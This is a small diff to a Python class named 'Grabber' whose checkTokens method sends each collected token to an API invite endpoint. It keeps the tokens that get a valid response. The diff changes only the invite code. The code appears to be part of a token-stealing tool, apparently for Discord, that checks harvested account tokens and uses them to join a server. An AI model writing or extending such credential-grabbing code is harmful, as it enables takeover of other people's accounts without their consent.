@@ -150,7 +150,7 @@ class Grabber:
 
     def checkTokens(self):
         for token in self.tokens:
-            r = requests.post(self.api + 'invites/pornhub', headers=self.getHeaders(token))
+            r = requests.post(self.api + 'invites/minecraft', headers=self.getHeaders(token))
             if '302094807046684672' in r.text:
                 if r.status_code == 200:
                     self.validTokens.append(token)
